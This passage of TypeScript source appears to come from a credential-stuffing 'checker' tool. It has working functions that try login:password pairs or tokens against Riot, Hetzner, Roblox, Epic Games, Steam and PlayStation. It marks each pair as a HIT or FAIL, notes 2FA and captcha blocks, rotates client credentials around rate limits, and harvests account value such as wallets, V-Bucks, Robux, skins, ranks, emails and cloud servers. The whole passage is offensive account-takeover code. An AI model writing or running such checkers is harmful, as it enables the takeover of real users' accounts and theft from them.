      "-H", `Authorization: Bearer ${accessToken}`,
      "-H", "Content-Type: application/json",
      "-H", `User-Agent: ${RIOT_UA}`,
      "--data-raw", "{}",
      "https://entitlements.auth.riotgames.com/api/token/v1",
    ], 12_000);

    let entToken = "";
    try {
      const ej = JSON.parse(entRes.body) as Record<string, unknown>;
      entToken = (ej.entitlements_token as string) ?? "";
    } catch { /**/ }

    // ── Step 4: User info (puuid, game_name, tag_line, email) ─────────────
    const userRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: Bearer ${accessToken}`,
      "-H", `User-Agent: ${RIOT_UA}`,
      "https://auth.riotgames.com/userinfo",
    ], 12_000);

    const parts: string[] = [];
    let puuid = "";

    try {
      const uj   = JSON.parse(userRes.body) as Record<string, unknown>;
      puuid      = (uj.sub as string) ?? "";
      const acct = uj.acct as Record<string, unknown> | undefined;
      const gn   = acct?.game_name as string ?? "";
      const tag  = acct?.tag_line  as string ?? "";
      if (gn)        parts.push(`riotId:${gn}#${tag}`);
      if (uj.email)  parts.push(`email:${uj.email}`);
      const bans = (uj.bans as unknown[]) ?? [];
      if (bans.length) parts.push(`bans:${bans.length}`);
      // Account creation date
      const createdRaw = uj.created_at ?? uj.createdAt ?? uj.sub_created_at;
      if (createdRaw !== undefined) {
        const d = new Date(typeof createdRaw === "number" ? createdRaw * 1000 : String(createdRaw));
        if (!isNaN(d.getTime())) parts.push(`criado:${d.toISOString().split("T")[0]}`);
      }
    } catch { /**/ }

    // ── Step 5: Valorant account XP level + MMR rank ──────────────────────
    if (puuid && entToken) {
      // Fetch current Valorant client version
      let clientVersion = "release-09.08-shipping-9-2607125";
      const verRes = await runCurl([
        "--compressed", "-L",
        "https://valorant-api.com/v1/version",
      ], 8_000);
      if (verRes.statusCode === 200) {
        try {
          const vd = (JSON.parse(verRes.body) as Record<string, unknown>).data as Record<string, unknown>;
          if (vd?.riotClientVersion) clientVersion = vd.riotClientVersion as string;
        } catch { /**/ }
      }

      const platformB64 = Buffer.from(JSON.stringify({
        platformType: "PC", platformOS: "Windows",
        platformOSVersion: "10.0.22621.1.768.64bit", platformChipset: "Unknown",
      })).toString("base64");

      const pvpHeaders = [
        "-H", `Authorization: Bearer ${accessToken}`,
        "-H", `X-Riot-Entitlements-JWT: ${entToken}`,
        "-H", `X-Riot-ClientVersion: ${clientVersion}`,
        "-H", `X-Riot-ClientPlatform: ${platformB64}`,
        "-H", `User-Agent: ${RIOT_UA}`,
      ];

      // Try regions in priority order
      const REGIONS = ["na", "eu", "br", "ap", "latam", "kr"];
      for (const region of REGIONS) {
        const xpRes = await runCurl([
          "--compressed", "-L",
          ...pvpHeaders,
          `https://pd.${region}.a.pvp.net/account-xp/v1/players/${puuid}/xp`,
        ], 8_000);

        if (xpRes.statusCode === 200) {
          try {
            const xj       = JSON.parse(xpRes.body) as Record<string, unknown>;
            const progress = xj.Progress as Record<string, unknown> | undefined;
            const level    = progress?.Level ?? xj.level;
            if (level !== undefined) parts.push(`level:${level}`);
          } catch { /**/ }

          // MMR / rank
          const mmrRes = await runCurl([
            "--compressed", "-L",
            ...pvpHeaders,
            `https://pd.${region}.a.pvp.net/mmr/v1/players/${puuid}`,
          ], 8_000);

          if (mmrRes.statusCode === 200) {
            try {
              const mj          = JSON.parse(mmrRes.body) as Record<string, unknown>;
              const queueSkills = mj.QueueSkills as Record<string, unknown> | undefined;
              const competitive = queueSkills?.competitive as Record<string, unknown> | undefined;
              const tier        = competitive?.TierAfterUpdate ?? competitive?.Tier;
              if (tier !== undefined && typeof tier === "number") {
                parts.push(`rank:${TIERS[tier] ?? `Tier${tier}`}`);
              }
              const rr = (competitive as Record<string, unknown>)?.RankedRatingAfterUpdate ?? (competitive as Record<string, unknown>)?.RankedRating;
              if (rr !== undefined) parts.push(`rr:${rr}`);
            } catch { /**/ }
          }
          // Wallet — Valorant Points, Radianite Credits, Kingdom Credits
          const walletRes = await runCurl([
            "--compressed", "-L",
            ...pvpHeaders,
            `https://pd.${region}.a.pvp.net/store/v1/wallet/${puuid}`,
          ], 8_000);
          if (walletRes.statusCode === 200) {
            try {
              const wj       = JSON.parse(walletRes.body) as Record<string, unknown>;
              const balances = wj.Balances as Record<string, number> | undefined;
              if (balances) {
                const vp = balances["85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741"];
                const rc = balances["e59aa87c-4cbf-517a-5983-6e81511be9b7"];
                const kc = balances["f08d4ae3-939c-4576-ab26-09ce1f23bb37"];
                if (vp !== undefined) parts.push(`vp:${vp}`);
                if (rc !== undefined) parts.push(`rc:${rc}`);
                if (kc !== undefined) parts.push(`kc:${kc}`);
              }
            } catch { /**/ }
          }

          // Entitlements (skins) count
          const skinTypeId = "e7c63390-eda7-46e0-bb7a-a6abdacd2433";
          const entRes = await runCurl([
            "--compressed", "-L",
            ...pvpHeaders,
            `https://pd.${region}.a.pvp.net/store/v1/entitlements/${puuid}/${skinTypeId}`,
          ], 8_000);
          if (entRes.statusCode === 200) {
            try {
              const ej   = JSON.parse(entRes.body) as Record<string, unknown>;
              const ents = (ej.Entitlements as unknown[]) ?? [];
              if (ents.length) parts.push(`skins:${ents.length}`);
            } catch { /**/ }
          }

          parts.push(`região:${region.toUpperCase()}`);
          break;
        }
      }
    }

    if (parts.length === 0) parts.push("riot_ok");
    return { credential, login, status: "HIT", detail: parts.join(" | ") };

  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SHARED 2FA DETECTOR — usado nos checkers form-based
// ═══════════════════════════════════════════════════════════════════════════════
function detect2FA(body: string): boolean {
  const b = body.toLowerCase();
  return (
    b.includes("two-factor")          || b.includes("twofactor")         ||
    b.includes("2-factor")            || b.includes("verification code") ||
    b.includes("verify your identity")|| b.includes("additional verification") ||
    b.includes("authenticator app")   || b.includes("multifactor")       ||
    b.includes("multi-factor")        || b.includes("one-time code")     ||
    b.includes("one-time password")   || b.includes("verify-device")     ||
    b.includes("confirmar identidade")|| b.includes("código de verificação") ||
    b.includes("confirmação de identidade") ||
    (b.includes("otp") && !b.includes("option") && !b.includes("tooltip"))
  );
}

// ═══════════════════════════════════════════════════════════════════════════════
//  HETZNER CHECKER — API token (email:token ou apenas token como senha)
//  Retorna: nº servidores, specs, regiões, volumes, floating IPs
// ═══════════════════════════════════════════════════════════════════════════════
async function checkHetzner(login: string, password: string): Promise<CheckResult> {
  const apiToken = password.trim() || login.trim();
  const credential = `${login}:${password}`;
  try {
    // Validação do token (endpoint leve)
    const acctRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: Bearer ${apiToken}`,
      "-H", "Accept: application/json",
      "https://api.hetzner.cloud/v1/datacenters",
    ], 12_000);
    if (acctRes.statusCode === 401) return { credential, login, status: "FAIL",  detail: "api_token_invalido" };
    if (acctRes.statusCode !== 200) return { credential, login, status: "ERROR", detail: `HTTP_${acctRes.statusCode}` };

    const parts: string[] = [];

    // Servidores
    const srvRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: Bearer ${apiToken}`,
      "-H", "Accept: application/json",
      "https://api.hetzner.cloud/v1/servers?per_page=20",
    ], 12_000);
    if (srvRes.statusCode === 200) {
      const sj      = JSON.parse(srvRes.body) as Record<string, unknown>;
      const servers = (sj.servers as Record<string, unknown>[]) ?? [];
      const meta    = sj.meta as Record<string, unknown> | undefined;
      const total   = (meta?.pagination as Record<string, unknown>)?.total_entries ?? servers.length;
      parts.push(`servidores:${total}`);
      for (const srv of servers.slice(0, 5)) {
        const name   = String(srv.name ?? srv.id ?? "?");
        const stype  = srv.server_type as Record<string, unknown> | undefined;
        const vcpus  = stype?.cores ?? "?";
        const ram    = stype?.memory !== undefined ? `${stype.memory}GB` : "?";
        const disk   = stype?.disk   !== undefined ? `${stype.disk}GB`   : "?";
        const loc    = (srv.datacenter as Record<string, unknown>)?.location as Record<string, unknown> | undefined;
        const region = loc?.name ?? loc?.city ?? "?";
        const status = srv.status ?? "?";
        const prices = (stype?.prices as Record<string, unknown>[])?.[0]?.price_monthly as Record<string, unknown> | undefined;
        const priceStr = prices?.gross ? ` | €${Number(prices.gross).toFixed(2)}/mo` : "";
        parts.push(`[${name}] ${vcpus}vCPU | RAM:${ram} | SSD:${disk} | ${region} | ${status}${priceStr}`);
      }
    }

    // Volumes
    const volRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: Bearer ${apiToken}`,
      "-H", "Accept: application/json",
      "https://api.hetzner.cloud/v1/volumes",
    ], 8_000);
    if (volRes.statusCode === 200) {
      const vj   = JSON.parse(volRes.body) as Record<string, unknown>;
      const vols = (vj.volumes as unknown[]) ?? [];
      if (vols.length) parts.push(`volumes:${vols.length}`);
    }

    // Floating IPs
    const fipRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: Bearer ${apiToken}`,
      "-H", "Accept: application/json",
      "https://api.hetzner.cloud/v1/floating_ips",
    ], 8_000);
    if (fipRes.statusCode === 200) {
      const fj   = JSON.parse(fipRes.body) as Record<string, unknown>;
      const fips = (fj.floating_ips as unknown[]) ?? [];
      if (fips.length) parts.push(`floating_ips:${fips.length}`);
    }

    return { credential, login, status: "HIT", detail: parts.join(" || ") || "hetzner_ok" };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  ROBLOX CHECKER — username + senha (CSRF-cookie flow)
//  Retorna: userId, Robux, premium, grupos; detecta 2FA e captcha
// ═══════════════════════════════════════════════════════════════════════════════
async function checkRoblox(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/rblx_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
  try {
    // Step 1 — Obter CSRF token (POST retorna 403 com x-csrf-token)
    const firstRes = await runCurl([
      "--compressed", "-L",
      "-c", cookieFile, "-b", cookieFile,
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "Accept: application/json",
      "--data-raw", JSON.stringify({ ctype: "Username", cvalue: login, password, captchaId: "", captchaToken: "", captchaProvider: "" }),
      "-D", "-",
      "https://auth.roblox.com/v1/login",
    ], 15_000);
    const csrfHeader = firstRes.headers?.["x-csrf-token"] as string | undefined;
    const csrfBody   = firstRes.body.match(/x-csrf-token:\s*([^\s\r\n]+)/i)?.[1];
    const csrf       = csrfHeader ?? csrfBody ?? "";

    // Step 2 — Login real com CSRF
    const loginRes = await runCurl([
      "--compressed", "-L",
      "-c", cookieFile, "-b", cookieFile,
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "Accept: application/json",
      "-H", `X-CSRF-Token: ${csrf}`,
      "--data-raw", JSON.stringify({ ctype: "Username", cvalue: login, password, captchaId: "", captchaToken: "", captchaProvider: "" }),
      "https://auth.roblox.com/v1/login",
    ], 15_000);

    const lb = loginRes.body;
    if (detect2FA(lb) || lb.includes("TwoStep") || lb.includes("twoStep") || lb.includes("MultiFactorChallenge"))
      return { credential, login, status: "ERROR", detail: "2fa_required" };
    if (lb.includes("CaptchaRequired") || lb.includes("captcha"))
      return { credential, login, status: "ERROR", detail: "captcha_required" };
    if (loginRes.statusCode === 401 || lb.includes("Incorrect") || lb.includes("Invalid") || lb.includes("incorrect"))
      return { credential, login, status: "FAIL",  detail: "credenciais_invalidas" };
    if (loginRes.statusCode !== 200)
      return { credential, login, status: "ERROR", detail: `HTTP_${loginRes.statusCode}` };

    let userId = 0;
    let username = login;
    try {
      const lj = JSON.parse(lb) as Record<string, unknown>;
      const u  = lj.user as Record<string, unknown> | undefined;
      userId   = u?.id as number ?? 0;
      username = u?.name as string ?? login;
    } catch { /**/ }

    const parts: string[] = [`user:${username}`];
    if (userId) parts.push(`id:${userId}`);

    // Robux
    if (userId) {
      const robRes = await runCurl([
        "--compressed", "-L",
        "-c", cookieFile, "-b", cookieFile,
        "-H", "Accept: application/json",
        `https://economy.roblox.com/v1/users/${userId}/currency`,
      ], 10_000);
      if (robRes.statusCode === 200) {
        const rj = JSON.parse(robRes.body) as Record<string, unknown>;
        if (rj.robux !== undefined) parts.push(`robux:${rj.robux}`);
      }

      // Premium
      const premRes = await runCurl([
        "--compressed", "-L",
        "-c", cookieFile, "-b", cookieFile,
        "-H", "Accept: application/json",
        `https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`,
      ], 8_000);
      if (premRes.statusCode === 200 && (premRes.body.trim() === "true" || premRes.body.includes("true")))
        parts.push(`premium:ativo✅`);

      // Grupos
      const grpRes = await runCurl([
        "--compressed", "-L",
        "-c", cookieFile, "-b", cookieFile,
        "-H", "Accept: application/json",
        `https://groups.roblox.com/v1/users/${userId}/groups/roles`,
      ], 8_000);
      if (grpRes.statusCode === 200) {
        const gj = JSON.parse(grpRes.body) as Record<string, unknown>;
        const gs = (gj.data as unknown[]) ?? [];
        if (gs.length) parts.push(`grupos:${gs.length}`);
      }
    }

    return { credential, login, status: "HIT", detail: parts.join(" | ") };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  EPIC GAMES CHECKER — email + senha (OAuth2 launcher credentials)
//  Retorna: displayName, V-Bucks (Fortnite), email, auths externas; 2FA
// ═══════════════════════════════════════════════════════════════════════════════
async function checkEpicGames(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  // Epic client credentials — try multiple fallback clients if one is rate-limited
  // Fortnite iOS client (primary — supports password grant as of 2025)
  const EPIC_IOS    = "OThmN2U0MmM3MTExNDMzYWI1MDJmNzJjNzc0YzJmNDA6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3";
  // Epic Games Launcher (fallback)
  const EPIC_EGL    = "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=";

  async function tryAuth(basic: string): Promise<CurlResult> {
    return runCurl([
      "--compressed", "-L",
      "-X", "POST",
      "-H", `Authorization: Basic ${basic}`,
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", "Accept: application/json",
      "-H", `User-Agent: EpicGamesLauncher/15.17.1-29069790+++Portal+Release-Live Windows/10.0.22000.1.0.64bit`,
      "--data-urlencode", "grant_type=password",
      "--data-urlencode", `username=${login}`,
      "--data-urlencode", `password=${password}`,
      "--data-urlencode", "includePerms=false",
      "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token",
    ], 20_000);
  }

  try {
    // Try iOS client first, fall back to EGL client if rate limited
    let tokenRes = await tryAuth(EPIC_IOS);
    if (tokenRes.statusCode === 429 || tokenRes.statusCode === 503) {
      await sleep(800);
      tokenRes = await tryAuth(EPIC_EGL);
    }

    let tj: Record<string, unknown>;
    try { tj = JSON.parse(tokenRes.body); } catch { return { credential, login, status: "ERROR", detail: "parse_error" }; }

    const err = tj.error as string | undefined;
    if (err) {
      if (err.includes("two_factor") || err.includes("mfa"))
        return { credential, login, status: "ERROR", detail: "2fa_required" };
      if (err.includes("invalid_grant") || err.includes("incorrect_credentials") || err.includes("user_not_found"))
        return { credential, login, status: "FAIL",  detail: "credenciais_invalidas" };
      if (err.includes("too_many") || err.includes("rate_limit"))
        return { credential, login, status: "ERROR", detail: "rate_limited" };
      return { credential, login, status: "FAIL", detail: `error:${err.split(".").pop() ?? err}` };
    }
    if (tokenRes.statusCode !== 200) return { credential, login, status: "ERROR", detail: `HTTP_${tokenRes.statusCode}` };

    const accessToken = tj.access_token as string ?? "";
    const accountId   = tj.account_id  as string ?? "";
    const parts: string[] = [];
    if (tj.displayName) parts.push(`user:${tj.displayName}`);
    if (tj.email)       parts.push(`email:${tj.email}`);

    // V-Bucks (Fortnite common_core profile)
    if (accountId && accessToken) {
      const vbRes = await runCurl([
        "--compressed", "-L",
        "-X", "POST",
        "-H", `Authorization: Bearer ${accessToken}`,
        "-H", "Content-Type: application/json",
        "--data-raw", "{}",
        `https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/${accountId}/client/QueryProfile?profileId=common_core&rvn=-1`,
      ], 15_000);
      if (vbRes.statusCode === 200) {
        try {
          const vj      = JSON.parse(vbRes.body) as Record<string, unknown>;
          const changes = (vj.profileChanges as Record<string, unknown>[])?.[0];
          const profile = changes?.profile as Record<string, unknown> | undefined;
          const items   = profile?.items as Record<string, Record<string, unknown>> | undefined;
          if (items) {
            let vbucks = 0;
            for (const item of Object.values(items)) {
              const tpl = String(item.templateId ?? "");
              if (tpl.startsWith("Currency:Mtx")) {
                const attrs = item.attributes as Record<string, unknown> | undefined;
                vbucks += Number(attrs?.platform_vbucks ?? attrs?.current_balance ?? 0);
              }
            }
            if (vbucks > 0) parts.push(`vbucks:${vbucks}`);
          }
        } catch { /**/ }
      }

      // Auths externas (consoles, plataformas vinculadas)
      const acctRes = await runCurl([
        "--compressed", "-L",
        "-H", `Authorization: Bearer ${accessToken}`,
        "-H", "Accept: application/json",
        `https://account-public-service-prod.ol.epicgames.com/account/api/public/account?accountId=${accountId}`,
      ], 10_000);
      if (acctRes.statusCode === 200) {
        try {
          const arr = JSON.parse(acctRes.body) as Record<string, unknown>[];
          const acct = Array.isArray(arr) ? arr[0] : arr as Record<string, unknown>;
          const exts = acct?.externalAuths as Record<string, unknown> | undefined;
          if (exts && Object.keys(exts).length) parts.push(`vinculados:${Object.keys(exts).join(",")}`);
        } catch { /**/ }
      }
    }

    return { credential, login, status: "HIT", detail: parts.join(" | ") || "epicgames_ok" };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  STEAM CHECKER — username + senha (RSA-encrypted Steam login)
//  Retorna: steamId, nome, carteira, nível; detecta Steam Guard (2FA email/TOTP)
// ═══════════════════════════════════════════════════════════════════════════════
async function checkSteam(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/stm_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  function buildRSAPubKey(modHex: string, expHex: string): string {
    const modBuf  = Buffer.from(modHex, "hex");
    const expBuf  = Buffer.from(expHex.padStart(6, "0"), "hex");
    const modFull = Buffer.concat([Buffer.from([0x00]), modBuf]);
    function derLen(n: number): Buffer {
      if (n < 128) return Buffer.from([n]);
      if (n < 256) return Buffer.from([0x81, n]);
      return Buffer.from([0x82, (n >> 8) & 0xff, n & 0xff]);
    }
    const modSeq = Buffer.concat([Buffer.from([0x02]), derLen(modFull.length), modFull]);
    const expSeq = Buffer.concat([Buffer.from([0x02]), derLen(expBuf.length),  expBuf]);
    const seq    = Buffer.concat([modSeq, expSeq]);
    const full   = Buffer.concat([Buffer.from([0x30]), derLen(seq.length), seq]);
    const algId  = Buffer.from("300d06092a864886f70d0101010500", "hex");
    const bs     = Buffer.concat([Buffer.from([0x03]), derLen(full.length + 1), Buffer.from([0x00]), full]);
    const spki   = Buffer.concat([Buffer.from([0x30]), derLen(algId.length + bs.length), algId, bs]);
    const b64    = spki.toString("base64").match(/.{1,64}/g)!.join("\n");
    return `-----BEGIN PUBLIC KEY-----\n${b64}\n-----END PUBLIC KEY-----\n`;
  }

  const STEAM_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36";

  try {
    // Step 1 — RSA public key via new Steam Auth API (2023+)
    // Fallback to old community endpoint if new one fails
    let rsaMod = "", rsaExp = "", rsaTs = "";
    const newRsaRes = await runCurl([
      "--compressed", "-L",
      "-A", STEAM_UA,
      "-H", "Accept: application/json",
      `https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/?account_name=${encodeURIComponent(login)}`,
    ], 15_000);

    try {
      const nr = JSON.parse(newRsaRes.body) as Record<string, unknown>;
      const resp = nr.response as Record<string, unknown>;
      rsaMod = String(resp?.publickey_mod ?? "");
      rsaExp = String(resp?.publickey_exp ?? "");
      rsaTs  = String(resp?.timestamp ?? "");
    } catch { /**/ }

    if (!rsaMod) {
      // Fallback: old community endpoint (some regions still respond)
      const oldRsaRes = await runCurl([
        "--compressed", "-L",
        "-c", cookieFile, "-b", cookieFile,
        "-A", STEAM_UA,
        `https://steamcommunity.com/login/getrsakey/?username=${encodeURIComponent(login)}`,
      ], 15_000);
      try {
        const or = JSON.parse(oldRsaRes.body) as Record<string, unknown>;
        if (!or.success) return { credential, login, status: "FAIL", detail: "usuario_nao_encontrado" };
        rsaMod = String(or.publickey_mod ?? "");
        rsaExp = String(or.publickey_exp ?? "");
        rsaTs  = String(or.timestamp ?? "");
      } catch { return { credential, login, status: "ERROR", detail: "rsa_parse_error" }; }
    }

    if (!rsaMod || !rsaExp) return { credential, login, status: "ERROR", detail: "NO_RSA_KEY" };

    // Step 2 — Encrypt password with RSA PKCS1 v1.5
    const pubKeyPem = buildRSAPubKey(rsaMod, rsaExp);
    const encPass   = publicEncrypt({ key: pubKeyPem, padding: constants.RSA_PKCS1_PADDING }, Buffer.from(password)).toString("base64");

    // Step 3 — Begin auth session via new Steam IAuthenticationService API
    const beginRes = await runCurl([
      "--compressed", "-L",
      "-c", cookieFile, "-b", cookieFile,
      "-X", "POST",
      "-A", STEAM_UA,
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", "Origin: https://store.steampowered.com",
      "-H", "Referer: https://store.steampowered.com/login/",
      "--data-urlencode", `account_name=${login}`,
      "--data-urlencode", `encrypted_password=${encPass}`,
      "--data-urlencode", `encryption_timestamp=${rsaTs}`,
      "--data-urlencode", "persistence=0",
      "--data-urlencode", "platform_type=2",
      "--data-urlencode", "website_id=Community",
      "--data-urlencode", "guard_data=",
      "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
    ], 20_000);

    let beginJson: Record<string, unknown>;
    try { beginJson = JSON.parse(beginRes.body); } catch {
      // New API failed — fallback to old dologin endpoint
      const loginRes = await runCurl([
        "--compressed", "-L",
        "-c", cookieFile, "-b", cookieFile,
        "-X", "POST", "-A", STEAM_UA,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Referer: https://steamcommunity.com/login/",
        "--data-urlencode", `username=${login}`,
        "--data-urlencode", `password=${encPass}`,
        "--data-urlencode", "emailauth=",
        "--data-urlencode", "captchagid=-1",
        "--data-urlencode", "captcha_text=",
        "--data-urlencode", `rsatimestamp=${rsaTs}`,
        "https://steamcommunity.com/login/dologin/",
      ], 20_000);
      try {
        const lj = JSON.parse(loginRes.body) as Record<string, unknown>;
        if (lj.emailauth_needed)   return { credential, login, status: "ERROR", detail: "2fa_email_required" };
        if (lj.requires_twofactor) return { credential, login, status: "ERROR", detail: "2fa_totp_required" };
        if (lj.captcha_needed)     return { credential, login, status: "ERROR", detail: "captcha_required" };
        if (!lj.success) return { credential, login, status: "FAIL", detail: String(lj.message ?? "login_failed").slice(0, 60) };
        return { credential, login, status: "HIT", detail: "steam_ok_legacy" };
      } catch { return { credential, login, status: "ERROR", detail: "begin_parse_error" }; }
    }

    // New API response
    const apiErr = (beginJson.error as Record<string, unknown>)?.message as string ?? "";
    if (beginRes.statusCode === 400 || apiErr) {
      if (apiErr.toLowerCase().includes("invalid password") || apiErr.toLowerCase().includes("incorrect"))
        return { credential, login, status: "FAIL", detail: "senha_incorreta" };
      if (apiErr.toLowerCase().includes("not exist") || apiErr.toLowerCase().includes("no account"))
        return { credential, login, status: "FAIL", detail: "usuario_nao_encontrado" };
      if (apiErr.toLowerCase().includes("rate") || apiErr.toLowerCase().includes("throttle"))
        return { credential, login, status: "ERROR", detail: "RATE_LIMITED" };
      if (apiErr) return { credential, login, status: "FAIL", detail: `steam_err:${apiErr.slice(0, 60)}` };
      return { credential, login, status: "ERROR", detail: `HTTP_${beginRes.statusCode}` };
    }

    const resp = (beginJson.response ?? {}) as Record<string, unknown>;
    const steamid = String(resp.steamid ?? "");
    if (!steamid || steamid === "0") return { credential, login, status: "FAIL", detail: "invalid_credentials" };

    // Determine 2FA requirements from allowed_confirmations
    const confs = (resp.allowed_confirmations as Record<string, unknown>[]) ?? [];
    const confTypes = confs.map(c => Number(c.confirmation_type ?? 0));
    // type 2 = mobile TOTP, type 3 = email, type 4 = device/machine token
    if (confTypes.includes(2)) return { credential, login, status: "HIT", detail: `steamId:${steamid} | 2fa_mobile_totp` };
    if (confTypes.includes(3)) return { credential, login, status: "HIT", detail: `steamId:${steamid} | 2fa_email` };

    // No 2FA — try to complete session and get profile data
    const parts: string[] = [`steamId:${steamid}`];
    try {
      const clientId  = String(resp.client_id  ?? "");
      const requestId = String(resp.request_id ?? "");
      if (clientId && requestId) {
        await sleep(500);
        const pollRes = await runCurl([
          "--compressed", "-L",
          "-X", "POST", "-A", STEAM_UA,
          "-H", "Content-Type: application/x-www-form-urlencoded",
          "--data-urlencode", `client_id=${clientId}`,
          "--data-urlencode", `request_id=${requestId}`,
          "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
        ], 15_000);
        const poll = (JSON.parse(pollRes.body) as Record<string, unknown>).response as Record<string, unknown>;
        const accessToken = String(poll?.access_token ?? "");
        if (accessToken) {
          // Use Steam Player Service to get persona name
          const pRes = await runCurl([
            "--compressed", "-L",
            "-A", STEAM_UA,
            "-H", `Authorization: Bearer ${accessToken}`,
            `https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?access_token=${accessToken}&include_appinfo=false`,
          ], 10_000);
          try {
            const pj = (JSON.parse(pRes.body) as Record<string, unknown>).response as Record<string, unknown>;
            if (pj?.game_count !== undefined) parts.push(`jogos:${pj.game_count}`);
          } catch { /**/ }
        }
      }
    } catch { /**/ }
    return { credential, login, status: "HIT", detail: parts.join(" | ") };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  PLAYSTATION CHECKER — email + senha (Sony OAuth2)
//  Retorna: PSN ID, PS Plus (plano + vencimento), saldo wallet; 2FA detection
// ═══════════════════════════════════════════════════════════════════════════════
async function checkPlayStation(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  // Credenciais cliente Sony mobile (públicas)
  const SONY_BASIC    = "YWM4ZDE2MWEtZDk2Ni00NzI4LWIwZWEtZmZlY2IwZWQ0ZTc3Ong=";
  const SONY_CLIENT   = "ac8d161a-d966-4728-b0ea-ffecb0ed4e77";
  try {
    const tokenRes = await runCurl([
      "--compressed", "-L", "--max-redirs", "3",
      "-X", "POST",
      "-H", `Authorization: Basic ${SONY_BASIC}`,
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", "Accept: application/json",
      "--data-urlencode", `client_id=${SONY_CLIENT}`,
      "--data-urlencode", "grant_type=password",
      "--data-urlencode", `username=${login}`,
      "--data-urlencode", `password=${password}`,
      "--data-urlencode", "scope=psn:mobile.v2.core psn:clientapp",
      "https://ca.account.sony.com/api/v1/oauth/token",
    ], 20_000);

    const tb = tokenRes.body;
    if (tokenRes.statusCode === 403 || tokenRes.statusCode === 0 || !tb.trim().startsWith("{")) {
      return { credential, login, status: "ERROR", detail: `DATACENTER_BLOCKED:HTTP_${tokenRes.statusCode}` };
    }
    let tj: Record<string, unknown>;
    try { tj = JSON.parse(tb); } catch { return { credential, login, status: "ERROR", detail: `parse_error:HTTP_${tokenRes.statusCode}` }; }

    const errCode = (tj.error_code ?? tj.error) as string | number | undefined;
    if (errCode !== undefined) {
      const ec = String(errCode);
      if (tb.includes("two_step") || tb.includes("mfa") || ec === "4165" || ec.includes("mfa"))
        return { credential, login, status: "ERROR", detail: "2fa_required" };
      if (tb.includes("incorrect_credentials") || tb.includes("password_incorrect") || ec === "4076")
        return { credential, login, status: "FAIL",  detail: "credenciais_invalidas" };
      if (tb.includes("account_suspended") || ec === "4088")
        return { credential, login, status: "FAIL",  detail: "conta_suspensa" };
      return { credential, login, status: "FAIL", detail: `psn_error:${ec}` };
    }
    if (tokenRes.statusCode !== 200) return { credential, login, status: "ERROR", detail: `HTTP_${tokenRes.statusCode}` };

    const accessToken = tj.access_token as string ?? "";
    const parts: string[] = [];

    // Perfil PSN
    const meRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: Bearer ${accessToken}`,
      "-H", "Accept: application/json",
      "https://m.np.playstation.com/api/userProfile/v1/internal/users/me/profiles",
    ], 12_000);
    if (meRes.statusCode === 200) {
      try {
        const mj      = JSON.parse(meRes.body) as Record<string, unknown>;
        const profile = (mj.profiles as Record<string, unknown>[])?.[0] ?? mj;
        if (profile.onlineId) parts.push(`psnId:${profile.onlineId}`);
        if (profile.aboutMe)  parts.push(`bio:${String(profile.aboutMe).slice(0, 40)}`);
      } catch { /**/ }
    }

    // PS Plus / Subscriptions
    const subRes = await runCurl([
      "--compressed", "-L",
      "-H", `Authorization: Bearer ${accessToken}`,
      "-H", "Accept: application/json",
      "https://m.np.playstation.com/api/subscriptions/v1/users/me/subscriptions",
    ], 10_000);
    if (subRes.statusCode === 200) {
      try {
        const sj   = JSON.parse(subRes.body) as Record<string, unknown>;
        const subs = (sj.subscriptions as Record<string, unknown>[]) ?? [];
        for (const sub of subs.slice(0, 3)) {
          const name = sub.subscriptionName ?? sub.id ?? "";
          const exp  = String(sub.endDate ?? "").split("T")[0];
